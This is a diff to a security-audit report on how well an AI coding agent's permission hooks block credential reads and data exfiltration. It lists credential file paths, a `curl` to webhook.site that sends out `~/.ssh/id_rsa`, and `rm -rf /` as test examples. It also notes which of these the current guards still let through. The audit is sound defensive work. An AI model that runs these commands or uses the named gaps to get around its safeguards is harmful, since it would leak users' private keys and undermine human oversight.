@@ -38,7 +38,7 @@ Only the groups below are worth recommending.
 
 | # | Finding | Why it matters | Hook coverage at HEAD |
 |---|---------|----------------|-----------------------|
-| 1 | No credential-read `permissions.deny` rules | `Read(~/.ssh/**)` and friends are the only thing between an agent and a private key | **NONE.** Measured: the `Read` matcher in `hooks.json` carries exactly `pretool/read/tldr-summary` and `lifecycle/webhook-forwarder`, neither of which denies. `cat ~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.netrc`, `~/.npmrc`, `~/.gnupg/secring.gpg` all ABSTAIN through `pretool/bash/sync-bash-dispatcher` while the `rm -rf /` control in the same run DENIES |
+| 1 | No credential-read `permissions.deny` rules | `Read(~/.ssh/**)` and friends are a second layer between an agent and a private key | **HOOK COVERAGE EXISTS** since 2026-08-16. Re-measured at `c429c0233`: the `Read` matcher in `hooks.json` carries `pretool/read/credential-read-guard` FIRST, then `pretool/read/tldr-summary` and `lifecycle/webhook-forwarder`. The guard DENIES `~/.ssh/**`, `~/.gnupg/**`, `~/.aws/credentials`, `~/.netrc`, `~/.npmrc`, matching both the lexical path and the realpath, case-folded for APFS. It covers the `Read` TOOL only, so a `cat ~/.ssh/id_rsa` through Bash is still the `sync-bash-dispatcher` lane. Deny rules remain worth having as defence in depth, not as the only thing |
 | 2 | No `sandbox` block | OS-level Bash isolation plus the exfil-domain denylist | **PARTIAL.** `pretool/bash/network-egress-guard` returns `ask` on the *upload* shape, but a plain `curl -s https://pastebin.com/raw/…`, and even `curl -s https://webhook.site/x?d=$(cat ~/.ssh/id_rsa)`, ABSTAIN. Prompt is not block, and GET-shaped exfil walks straight through |
 | 3 | `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` in no settings file | ork's own `src/hooks/src/lib/agent-teams.ts:28` gates `isAgentTeamsActive()` on `=== '1'`. Without it, team mode degrades silently: no error, no log line | N/A, a hook cannot set its own env |
 
@@ -144,7 +144,7 @@ tool names (`mcp__hq-channels__whatsapp_send_image`, `…_send_audio`, `…_send
 ```
 +-- Check 16: Operator Settings Posture ----------------------------------+
 | ❌ permissions.deny  0 credential-read rules across 4 scopes             |
-|    Read(~/.ssh/**) has ZERO hook coverage. Measured, not assumed.        |
+|    Read tool IS hook-covered; deny rules add depth. Bash lane differs. |
 | ❌ sandbox          absent from user AND local settings                  |
 |    deniedDomains: 0, so GET-shaped exfil is unguarded.                   |
 | ⚠️ AGENT_TEAMS      settings=no  shell=yes                               |
